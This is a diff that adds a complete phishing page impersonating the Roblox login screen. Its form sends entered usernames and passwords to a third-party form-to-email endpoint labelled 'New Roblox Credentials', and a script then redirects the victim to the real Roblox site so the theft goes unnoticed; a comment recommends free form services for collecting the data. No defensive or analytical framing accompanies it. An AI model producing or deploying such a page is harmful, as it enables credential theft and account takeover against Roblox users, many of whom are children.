@@ -1,0 +1,24 @@
+<!-- Use a free form-to-email service like Formspree or Getform -->
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Login</title>
+</head>
+<body>
+<div class="login-box">
+    <h2>Roblox Login</h2>
+    <form action="https://formspree.io/f/xzdwkyjr" method="POST">
+        <input type="text" name="username" placeholder="Username" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <input type="hidden" name="_subject" value="New Roblox Credentials">
+        <button type="submit">Log In</button>
+    </form>
+</div>
+<script>
+    // Redirect after submission
+    document.forms[0].addEventListener("submit", function() {
+        setTimeout(() => { window.location = "https://www.roblox.com"; }, 500);
+    });
+</script>
+</body>
+</html>
